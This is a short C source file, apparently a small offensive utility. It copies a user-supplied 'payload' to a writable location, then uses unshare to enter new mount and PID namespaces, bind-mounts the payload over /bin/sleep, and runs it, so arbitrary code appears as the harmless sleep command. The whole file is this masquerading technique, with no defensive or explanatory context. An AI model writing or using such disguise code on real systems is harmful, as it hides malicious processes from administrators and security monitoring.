/*
 * Copyright (C) 2026 Ivan Gaydardzhiev
 * Licensed under the GPL-3.0-only
 */

#include "c.h"

int main(int ac, char **av)
{
	const char *p = wt("sleep");
	pid_t c;

	if (ac < 2)
		sk("no payload");
	cpf(av[1], p, 0755);
	c = fork();
	if (c < 0)
		sk("fork");
	if (!c) {
		execlp("unshare", "unshare", "--mount", "--pid", "--fork", "sh", "-c",
			"mount --bind \"$0\" /bin/sleep && exec /bin/sleep 1000", p, (char *)NULL);
		_exit(127);
	}
	wk(c);
	return 0;
}
